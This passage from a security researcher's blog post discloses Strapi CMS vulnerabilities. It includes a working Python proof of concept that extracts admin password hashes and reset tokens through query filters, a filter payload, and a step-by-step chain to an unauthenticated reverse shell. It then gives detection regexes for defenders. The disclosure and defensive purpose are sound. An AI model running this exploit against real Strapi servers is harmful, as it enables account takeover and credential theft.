+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/editor-dump-sensitive-data.gif"/>
+</p>
+<p>
+ It was at this point I decided I had enough information about the vulnerability to report it Strapi and provided them with the following POC script along with the above GIFs to demonstrate the severity.
+</p>
+<details>
+ <summary>
+  <b>
+   Dumping Sensitive User Data as Admin POC
+  </b>
+ </summary>
+ <div class="codehilite">
+  <pre><span></span><code><span class="kn">import</span> <span class="nn">argparse</span><span class="o">,</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">urllib.parse</span> <span class="k">as</span> <span class="nn">urlparse</span>
+<span class="kn">from</span> <span class="nn">concurrent.futures</span> <span class="kn">import</span> <span class="n">ThreadPoolExecutor</span>
+
+<span class="n">THREADS</span><span class="o">=</span><span class="mi">20</span>
+<span class="n">BCRYPT_CHARS</span> <span class="o">=</span> <span class="s2">"$./ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"</span>
+<span class="n">TOTAL_CHARS</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">BCRYPT_CHARS</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">parse_args</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="n">argparse</span><span class="o">.</span><span class="n">Namespace</span><span class="p">:</span>
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
+
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+        <span class="s1">'-u'</span><span class="p">,</span> <span class="s1">'--username'</span><span class="p">,</span>
+        <span class="n">help</span><span class="o">=</span><span class="s1">'The email of an admin account on Strapi'</span><span class="p">,</span>
+        <span class="n">required</span><span class="o">=</span><span class="kc">True</span>
+    <span class="p">)</span>
+
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+        <span class="s1">'-p'</span><span class="p">,</span> <span class="s1">'--password'</span><span class="p">,</span>
+        <span class="n">help</span><span class="o">=</span><span class="s1">'The password of an admin account on Strapi'</span><span class="p">,</span>
+        <span class="n">required</span><span class="o">=</span><span class="kc">True</span>
+    <span class="p">)</span>
+
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
+        <span class="s1">'target'</span><span class="p">,</span>
+        <span class="n">help</span><span class="o">=</span><span class="s1">'Target URL'</span>
+    <span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+
+
+<span class="k">class</span> <span class="nc">StrapiSession</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">):</span>
+    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">base_url</span><span class="p">,</span> <span class="n">api_token</span><span class="p">):</span>
+        <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="fm">__init__</span><span class="p">()</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">base_url</span> <span class="o">=</span> <span class="n">base_url</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">api_token</span> <span class="o">=</span> <span class="n">api_token</span>
+
+    <span class="k">def</span> <span class="nf">request</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">method</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+        <span class="n">joined_url</span> <span class="o">=</span> <span class="n">urlparse</span><span class="o">.</span><span class="n">urljoin</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">base_url</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
+        <span class="n">headers</span> <span class="o">=</span> <span class="n">kwargs</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"headers"</span><span class="p">,</span> <span class="p">{})</span>
+        <span class="n">headers</span><span class="p">[</span><span class="s2">"Authorization"</span><span class="p">]</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">"Bearer </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">api_token</span><span class="si">}</span><span class="s2">"</span>
+        <span class="n">kwargs</span><span class="p">[</span><span class="s2">"headers"</span><span class="p">]</span> <span class="o">=</span> <span class="n">headers</span>
+        <span class="k">return</span> <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="n">method</span><span class="p">,</span> <span class="n">joined_url</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">get_api_token</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+        <span class="n">urlparse</span><span class="o">.</span><span class="n">urljoin</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="s2">"/admin/login"</span><span class="p">),</span>
+        <span class="n">json</span><span class="o">=</span><span class="p">{</span>
+            <span class="s2">"email"</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
+            <span class="s2">"password"</span><span class="p">:</span> <span class="n">password</span>
+        <span class="p">}</span>
+    <span class="p">)</span>
+    <span class="n">r_json</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+    <span class="k">if</span> <span class="s2">"error"</span> <span class="ow">in</span> <span class="n">r_json</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s2">"Invalid admin credentials were provided"</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">r_json</span><span class="p">[</span><span class="s2">"data"</span><span class="p">][</span><span class="s2">"token"</span><span class="p">]</span>
+
+
+<span class="k">def</span> <span class="nf">get_users</span><span class="p">(</span><span class="n">s</span><span class="p">:</span> <span class="n">StrapiSession</span><span class="p">,</span> <span class="n">api_url</span><span class="p">):</span>
+    <span class="n">user_emails</span><span class="o">=</span><span class="p">[]</span>
+    <span class="n">page</span><span class="o">=</span><span class="mi">1</span>
+    <span class="n">total_pages</span><span class="o">=</span><span class="kc">None</span>
+
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">api_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+            <span class="s2">"pageSize"</span><span class="p">:</span> <span class="mi">10</span><span class="p">,</span>
+            <span class="s2">"page"</span><span class="p">:</span> <span class="n">page</span>
+        <span class="p">})</span>
+
+        <span class="n">r_json</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+        <span class="k">if</span> <span class="s2">"data"</span> <span class="ow">in</span> <span class="n">r_json</span><span class="p">:</span>
+            <span class="n">r_json</span> <span class="o">=</span> <span class="n">r_json</span><span class="p">[</span><span class="s2">"data"</span><span class="p">]</span>
+        <span class="n">total_pages</span> <span class="o">=</span> <span class="n">r_json</span><span class="p">[</span><span class="s2">"pagination"</span><span class="p">][</span><span class="s2">"pageCount"</span><span class="p">]</span>
+        <span class="n">page</span> <span class="o">=</span> <span class="n">r_json</span><span class="p">[</span><span class="s2">"pagination"</span><span class="p">][</span><span class="s2">"page"</span><span class="p">]</span>
+
+        <span class="n">user_emails</span><span class="o">.</span><span class="n">extend</span><span class="p">([</span><span class="n">u</span><span class="p">[</span><span class="s2">"email"</span><span class="p">]</span> <span class="k">for</span> <span class="n">u</span> <span class="ow">in</span> <span class="n">r_json</span><span class="p">[</span><span class="s2">"results"</span><span class="p">]])</span>
+        <span class="k">if</span> <span class="n">total_pages</span> <span class="o">==</span> <span class="n">page</span><span class="p">:</span>
+            <span class="k">break</span>
+        <span class="n">page</span> <span class="o">+=</span> <span class="mi">1</span>
+
+    <span class="k">return</span> <span class="n">user_emails</span>
+
+
+<span class="k">def</span> <span class="nf">attempt_char</span><span class="p">(</span><span class="n">s</span><span class="p">:</span> <span class="n">StrapiSession</span><span class="p">,</span> <span class="n">api_url</span><span class="p">,</span> <span class="n">email</span><span class="p">,</span> <span class="n">known_hash</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">keyname</span><span class="p">):</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
+        <span class="n">api_url</span> <span class="o">+</span> <span class="sa">f</span><span class="s2">"?pageSize=1&amp;page=1&amp;filters[$and][0][email][$eq]=</span><span class="si">{</span><span class="n">email</span><span class="si">}</span><span class="s2">&amp;filters[$and][1][</span><span class="si">{</span><span class="n">keyname</span><span class="si">}</span><span class="s2">][$startsWith]=</span><span class="si">{</span><span class="n">known_hash</span> <span class="o">+</span> <span class="n">c</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span>
+    <span class="p">)</span>
+    <span class="n">r_json</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+    <span class="k">if</span> <span class="s2">"data"</span> <span class="ow">in</span> <span class="n">r_json</span><span class="p">:</span>
+        <span class="n">r_json</span> <span class="o">=</span> <span class="n">r_json</span><span class="p">[</span><span class="s2">"data"</span><span class="p">]</span>
+
+    <span class="k">if</span> <span class="n">r_json</span><span class="p">[</span><span class="s2">"pagination"</span><span class="p">][</span><span class="s2">"total"</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="k">return</span> <span class="p">(</span><span class="kc">True</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span>
+    <span class="k">return</span> <span class="p">(</span><span class="kc">False</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">dump_user_data</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">api_url</span><span class="p">,</span> <span class="n">email</span><span class="p">,</span> <span class="n">keyname</span><span class="p">):</span>
+    <span class="c1"># Bcrypt hashes start with $2a$</span>
+    <span class="n">dumped_data</span> <span class="o">=</span> <span class="s2">""</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="se">\t</span><span class="si">{</span><span class="n">email</span><span class="si">}</span><span class="s2">:"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">""</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
+
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">found_char</span> <span class="o">=</span> <span class="kc">False</span>
+
+        <span class="k">with</span> <span class="n">ThreadPoolExecutor</span><span class="p">(</span><span class="n">max_workers</span><span class="o">=</span><span class="n">THREADS</span><span class="p">)</span> <span class="k">as</span> <span class="n">executor</span><span class="p">:</span>
+            <span class="n">futures</span> <span class="o">=</span> <span class="n">executor</span><span class="o">.</span><span class="n">map</span><span class="p">(</span>
+                <span class="n">attempt_char</span><span class="p">,</span>
+                <span class="n">TOTAL_CHARS</span> <span class="o">*</span> <span class="p">[</span><span class="n">s</span><span class="p">],</span>
+                <span class="n">TOTAL_CHARS</span> <span class="o">*</span> <span class="p">[</span><span class="n">api_url</span><span class="p">],</span>
+                <span class="n">TOTAL_CHARS</span> <span class="o">*</span> <span class="p">[</span><span class="n">email</span><span class="p">],</span>
+                <span class="n">TOTAL_CHARS</span> <span class="o">*</span> <span class="p">[</span><span class="n">dumped_data</span><span class="p">],</span>
+                <span class="n">BCRYPT_CHARS</span><span class="p">,</span>
+                <span class="n">TOTAL_CHARS</span> <span class="o">*</span> <span class="p">[</span><span class="n">keyname</span><span class="p">]</span>
+            <span class="p">)</span>
+
+            <span class="k">for</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">futures</span><span class="p">:</span>
+                <span class="n">matched_char</span><span class="p">,</span> <span class="n">char</span> <span class="o">=</span> <span class="n">result</span>
+                <span class="k">if</span> <span class="n">matched_char</span><span class="p">:</span>
+                    <span class="n">found_char</span> <span class="o">=</span> <span class="kc">True</span>
+                    <span class="n">dumped_data</span> <span class="o">=</span> <span class="n">dumped_data</span> <span class="o">+</span> <span class="n">char</span>
+                    <span class="nb">print</span><span class="p">(</span><span class="n">char</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">""</span><span class="p">)</span>
+                    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
+                    <span class="k">break</span>
+
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">found_char</span><span class="p">:</span>
+            <span class="k">break</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">""</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">dump_hashes</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">api_url</span><span class="p">,</span> <span class="n">start_msg</span><span class="p">):</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">start_msg</span> <span class="o">+</span> <span class="s2">" Password Hashes"</span><span class="p">)</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">user_emails</span> <span class="o">=</span> <span class="n">get_users</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">api_url</span><span class="p">)</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">"Your account does not have permissions!"</span><span class="p">)</span>
+        <span class="k">return</span>
+
+    <span class="k">for</span> <span class="n">email</span> <span class="ow">in</span> <span class="n">user_emails</span><span class="p">:</span>
+        <span class="n">dump_user_data</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">api_url</span><span class="p">,</span> <span class="n">email</span><span class="p">,</span> <span class="s2">"password"</span><span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">()</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="n">start_msg</span> <span class="o">+</span> <span class="s2">" Password Reset Tokens"</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">email</span> <span class="ow">in</span> <span class="n">user_emails</span><span class="p">:</span>
+        <span class="n">dump_user_data</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">api_url</span><span class="p">,</span> <span class="n">email</span><span class="p">,</span> <span class="s2">"reset_password_token"</span><span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
+    <span class="n">username</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">username</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">password</span>
+    <span class="n">target</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">target</span>
+
+    <span class="n">api_token</span> <span class="o">=</span> <span class="n">get_api_token</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+
+    <span class="k">with</span> <span class="n">StrapiSession</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">api_token</span><span class="p">)</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
+        <span class="n">dump_hashes</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s2">"/admin/users"</span><span class="p">,</span> <span class="s2">"Dumping Admin Account"</span><span class="p">)</span>
+        <span class="n">dump_hashes</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s2">"/content-manager/collection-types/plugin::users-permissions.user"</span><span class="p">,</span> <span class="s2">"Dumping API User Account"</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
+    <span class="n">args</span> <span class="o">=</span> <span class="n">parse_args</span><span class="p">()</span>
+    <span class="n">main</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
+</code></pre>
+ </div>
+</details>
+<p>
+ Originally I reported this vulnerability with a Medium severity to Strapi. However, deep down I knew the scope of this vulnerability was most likely way more impactful than what I discovered in my original report.
+ <em>
+  I just needed the evidence.
+ </em>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style6 ">
+<div class="inner">
+<div class="content">
+
+<h2 class="major" id="but-wait-it-gets-worst">
+ But Wait, It Gets Worst...
+</h2>
+<p>
+ Shortly after I sent the initial report for this vulnerability, my holiday break finished and work was pretty heckers during the start of this year. However, during my free time I continued writing articles about these vulnerabilities, maintained communications with Strapi and started taking a closer look at this vulnerability in particular. Something about it just didn't sit right with me, since I felt the filtering functionality of Strapi is used everywhere in the CMS.
+ <em>
+  I just knew there was some method to be able to dump sensitive user data as an unauthenticated user.
+ </em>
+</p>
+<p>
+ I decided to move from a bare bones configuration of my Strapi test server and start adding custom collections along with installing popular 3rd part plugins. One of the plugins I added was the
+ <a href="https://market.strapi.io/plugins/strapi-plugin-comments">
+  Comments Plugin
+ </a>
+ that enables API users to add comments to configured collections. Looking at the content type schema for comments within the plugin (
+ <a href="https://github.com/VirtusLab-Open-Source/strapi-plugin-comments/blob/master/content-types/comment.ts">
+  source code
+ </a>
+ ), I noticed that there was a relational field to API users named
+ <code>
+  authorUser
+ </code>
+ .
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/comments-authorUser-relation.png"/>
+</p>
+<p>
+ That's when it clicked for me.
+</p>
+<p>
+ <em>
+  What if this vulnerability does not require direct access to the API and Admin user collections and I can use the relational fields within other collections to get to the sensitive fields for users?
+ </em>
+</p>
+<p>
+ So I decided to test out my theory by adding a comment and see if I can exploit this vulnerability to filter comments as an API user by the comment author's password hash. I created a collection named
+ <code>
+  Article
+ </code>
+ that was configured to allow users to add comments. Then using a different API user account I added a comment to an article entry that I created. The following screenshot shows the API response when I query for comments as an API user.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/comments-query.png"/>
+</p>
+<p>
+ Then I added the following filter to see if I can filter the results of the query using the start of a Bcrypt hash.
+</p>
+<div class="codehilite">
+ <pre><span></span><code>filters[$and][0][authorUser][password][$startsWith]=$2a
+</code></pre>
+</div>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/unauth-filtering-by-hash.png"/>
+</p>
+<p>
+ <em>
+  Holy mackarel...
+ </em>
+</p>
+<p>
+ <strong>
+  Yes you can use relational fields within collections to filter by private fields for user accounts and leak their sensitive data!
+ </strong>
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/monke-shock.gif"/>
+</p>
+<p>
+ When I realised this was the case, I immediately contacted Strapi about this new development and advised them that we should not publicly disclose my SSTI to RCE vulnerability (it was originally planned to be released on the 21st of January) until this vulnerability was patched. Since relational fields were also exploitable, it meant collections with relational fields to Strapi administrator user accounts can be exploited by an API user to
+ <strong>
+  dump sensitive data for admin users
+ </strong>
+ . The only prerequisite were:
+</p>
+<ol>
+ <li>
+  A collection needs to have a relational field to Strapi administrator users.
+ </li>
+ <li>
+  There is an entry where the relational field is mapped to an admin user.
+ </li>
+ <li>
+  API or unauthenticated users are assigned the
+  <code>
+   find
+  </code>
+  permission for the collection with the relational mapping to admin users.
+ </li>
+</ol>
+<p>
+ For an example, the
+ <code>
+  Article
+ </code>
+ collection I created for this demonstration has a field name
+ <code>
+  author
+ </code>
+ that is a relation mapping to an admin user. I then created an
+ <code>
+  Article
+ </code>
+ entry and set the
+ <code>
+  author
+ </code>
+ field to map to my super admin account named
+ <code>
+  Nigel
+ </code>
+ .
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/article-demo-entry.png"/>
+</p>
+<p>
+ I then allowed public users to perform the
+ <code>
+  find
+ </code>
+ operation on the
+ <code>
+  Article
+ </code>
+ collection (a realistic configuration) and tested if I could start dumping the admin's password hash by exploiting the relational mapping.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/accessing-admin-hash-by-relation.png"/>
+</p>
+<p>
+ <em>
+  Hoooooly mackarel..
+ </em>
+</p>
+<p>
+ However, this was not the worst case scenario since successful exploitation depends on a Strapi collection to be configured to have a field that maps to an admin user. An unauthenticated would only be able to exploit this vulnerability for a limited number of Strapi instances and does not guarantee accessing sensitive information of users for every Strapi server.
+</p>
+<p>
+ <em>
+  However, what if there was a way to always find a mapping to Strapi admin users no matter how collections are configured...
+ </em>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style4 alt">
+<div class="inner">
+<div class="content">
+
+<h2 class="major" id="but-wait-it-is-the-worst-case-scenario">
+ But Wait, It Is The Worst Case Scenario...
+</h2>
+<p>
+ I was about to stop exploring how deep I can take this vulnerability, when something caught my eye on the Strapi admin panel when I was mucking about with collections.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/created_by_panel.png"/>
+</p>
+<p>
+ <em>
+  How on earth does Strapi know my administrator account created and updated this entry?
+ </em>
+</p>
+<p>
+ Digging into the backend database, I realised that when you create a collection on Strapi it automatically creates the
+ <code>
+  created_by_id
+ </code>
+ and
+ <code>
+  updated_by_id
+ </code>
+ columns that are foreign keys to the
+ <strong>
+  corresponding admin user
+ </strong>
+ . Poking at the API request I sent, you can see Strapi automatically returns the information about the Admin users based on the values of the
+ <code>
+  created_by_id
+ </code>
+ and
+ <code>
+  updated_by_id
+ </code>
+ columns.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/auto-mapping-admin-users.png"/>
+</p>
+<p>
+ <em>
+  Looking at that API response gave me an epiphany.
+ </em>
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/epiphany.gif"/>
+</p>
+<p>
+ Whenever a Strapi administrator creates or updates an entry for a collection, Strapi will automatically
+ <strong>
+  create a
+  <code>
+   createdBy
+  </code>
+  and
+  <code>
+   usedBy
+  </code>
+  relational mapping to the Administrator user
+ </strong>
+ ! Therefore,
+ <strong>
+  you can dump Strapi administrator password hashes and reset tokens using any accessible collection
+ </strong>
+ ! To confirm my suspicions, I went back to the
+ <code>
+  Article
+ </code>
+ entry I created and tested if I could leak the admin password hash using the
+ <code>
+  createdBy
+ </code>
+ relational field.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/exploiting-createdby.png"/>
+</p>
+<p>
+ <em>
+  oooooooooh geez
+ </em>
+</p>
+<p>
+ This was the worst case scenario. Not going to lie I started to shake when I realised that this was the case and informed Strapi of the growing severity of this vulnerability. This meant that
+ <strong>
+  on every Strapi server
+ </strong>
+ you could
+ <strong>
+  leak the password hashes and password reset tokens of Strapi administrator accounts as an unauthenticated user
+ </strong>
+ !
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style3 ">
+<div class="inner">
+<div class="content">
+
+<h2 class="major" id="why-it-took-months-to-fix">
+ Why It Took Months To Fix
+</h2>
+<p>
+ Of the three vulnerabilities I reported to Strapi, this one was the hardest to patch by a large margin. In my initial recommendation to Strapi, I said:
+</p>
+<blockquote>
+ <p>
+  Strapi needs to restrict what type of column names that can be used as filters. For an example, the "password" and "reset_password_token" columns should be ignored if included in a filter.
+ </p>
+</blockquote>
+<p>
+ <strong>
+  This was a gross simplification for the work that needed to be done to patch this vulnerability.
+ </strong>
+</p>
+<p>
+ Strapi had to
+ <strong>
+  update 280+ files in their patch
+ </strong>
+ (does include test files). Because so many files were updated, I won't be doing a deep technical dive into how this vulnerability was fixed (would have to turn this article into a book) and just provide the following overview that Strapi did:
+</p>
+<ul>
+ <li>
+  Implement query parameter sanitising for all top level operators (eg. filters, sort, population, etc) that removed any private fields from query parameters.
+ </li>
+ <li>
+  Added a global search operator (
+  <code>
+   _q
+  </code>
+  ) that removed any fields that have the
+  <code>
+   searchable
+  </code>
+  attribute to
+  <code>
+   false
+  </code>
+  .
+ </li>
+ <li>
+  Sanitised column names before executing the query.
+ </li>
+</ul>
+<p>
+ This was why Strapi took
+ <em>
+  a long time to fix this vulnerability
+ </em>
+ .
+ <strong>
+  The scale of this vulnerability was massive and impacted the entire CMS!
+ </strong>
+ I only explained a couple methods in this article about how to exploit this vulnerability, but nearly every feature within Strapi was vulnerable if you dug around. There is even a likely chance that popular Strapi plugins would still have this vulnerability when this article is released. That's why this patch took so long to be completed by Strapi. Their approach was to verify and cover as many edge cases as possible before applying the patch and announcing this vulnerability.
+</p>
+<p>
+ <em>
+  That was a tonne of work and major kudos for the Strapi team for implementing the solution!
+ </em>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style2 alt">
+<div class="inner">
+<div class="content">
+
+<h1 class="major" id="chaining-cve-2023-22621-and-cve-2023-22894-together-to-achieve-unauthenticated-rce">
+ Chaining CVE-2023-22621 and CVE-2023-22894 Together to Achieve Unauthenticated RCE
+</h1>
+<p>
+ Now for the fun part and
+ <strong>
+  pop a reverse shell as an unauthenticated user
+ </strong>
+ ! To do this we need to first exploit
+ <strong>
+  CVE-2023-22894
+ </strong>
+ to hijack a
+ <strong>
+  Super Administrator Account
+ </strong>
+ , then with the privileged access we will be able to exploit
+ <strong>
+  CVE-2023-22621
+ </strong>
+ ! The high level overview of getting unauthenticated RCE is as follows:
+</p>
+<p>
+ <strong>
+  Exploiting CVE-2023-22894
+ </strong>
+ <br/>
+ 1. Search for any entry on a publicly accessible entry for a collection that was created or updated by a super administrator user.
+ <br/>
+ 2. Leak the email address for the super administrator user.
+ <br/>
+ 3. Perform the forgot my password action for the super administrator account.
+ <br/>
+ 4. Leak the reset password token for the super administrator user.
+ <br/>
+ 5. Set a new password for the super administrator account and grab the API token for the admin API.
+</p>
+<p>
+ <strong>
+  Exploiting CVE-2023-22621
+ </strong>
+</p>
+<ol start="6">
+ <li>
+  Set a crafted email template that execute arbitrary terminal commands when rendered for when API accounts register.
+ </li>
+ <li>
+  Enable sending emails on API account registration.
+ </li>
+ <li>
+  Register a new API account to trigger the RCE vulnerability.
+ </li>
+ <li>
+  <code>
+   you g0t mail
+  </code>
+ </li>
+</ol>
+<p>
+ I will not be immediately releasing my POC that I sent to Strapi. However, I will show off the below GIF of running my POC that
+ <strong>
+  pops a reverse shell
+ </strong>
+ as an
+ <strong>
+  unauthenticated user
+ </strong>
+ on my test server running Strapi version 4.5.5.
+</p>
+<p>
+ <img alt="" class="center" src="/images/blog/multi_strapi_vulns/popping-unauth-shell.gif"/>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style6 ">
+<div class="inner">
+<div class="content">
+
+<h1 class="major" id="indicators-of-compromise">
+ Indicators of Compromise
+</h1>
+<p>
+ One of my primary concerns about finding all of these vulnerabilities in Strapi is that there is a strong possibility that a malicious actor has already discovered them and are actively exploiting them in the wild.
+ <em>
+  Especially considering that Strapi is an open source project and anyone could review the code.
+ </em>
+ To assist blue teams I will provide Indicators of Compromise (IoCs) for these vulnerabilities. The following IoCs are based on having access to request logs and do not consider the use of additional logging tools/resources.
+</p>
+<h2 class="major" id="detecting-aws-cognito-auth-bypass-cve-2023-22893">
+ Detecting AWS Cognito Auth Bypass (CVE-2023-22893)
+</h2>
+<p>
+ <em>
+  Although you should not log OAuth auth and ID tokens
+ </em>
+ , they are included as GET parameters to
+ <code>
+  /api/auth/cognito/callback
+ </code>
+ and will be likely logged in request logs for default configurations. This gives us a method to query request log files for suspicious JWT tokens for authenticating to the AWS Cognito login provider.
+</p>
+<p>
+ The following regex pattern will extract all of the ID tokens sent to
+ <code>
+  /api/auth/cognito/callback
+ </code>
+ .
+</p>
+<div class="codehilite">
+ <pre><span></span><code><span class="sr">/\/api\/auth\/cognito\/callback\?[\s\S]*id_token=\s*([\S]*)/</span><span class="w"></span>
+</code></pre>
+</div>
+<p>
+ Once you have a list of the ID tokens, you will need to verify each token using the
+ <strong>
+  public key file for your AWS Cognito user pool
+ </strong>
+ that you can download from
+ <code>
+  https://cognito-idp.{region}.amazonaws.com/{userPoolId}/.well-known/jwks.json
+ </code>
+ . If there are any JWT tokens that cannot be verified using the correct public key, then you need to inspect the JWT body and see if it contains the
+ <code>
+  email
+ </code>
+ and
+ <code>
+  cognito:username
+ </code>
+ claims (example below).
+</p>
+<div class="codehilite">
+ <pre><span></span><code><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="nt">"cognito:username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"auth-bypass-example"</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="nt">"email"</span><span class="p">:</span><span class="w"> </span><span class="s2">"pleasedonttakeovermy@ccount.com"</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre>
+</div>
+<p>
+ If there are any JWTs that have this body, verify when the account with the email address was created. If the account was created earlier than the request to
+ <code>
+  /api/auth/cognito/callback
+ </code>
+ with the invalid JWT token, then you need to
+ <strong>
+  contact the user to inform them their account has been breached
+ </strong>
+ !
+</p>
+<h2 class="major" id="detecting-leaking-sensitive-user-data-cve-2023-22894">
+ Detecting Leaking Sensitive User Data (CVE-2023-22894)
+</h2>
+<p>
+ The exploitation of
+ <strong>
+  CVE-2023-22894
+ </strong>
+ is easily detectable, since the payload is within the GET parameters and are normally included in request logs. The following regex pattern will extract requests that are exploiting this vulnerability to leak user's email, password and password reset token columns.
+</p>
+<div class="codehilite">
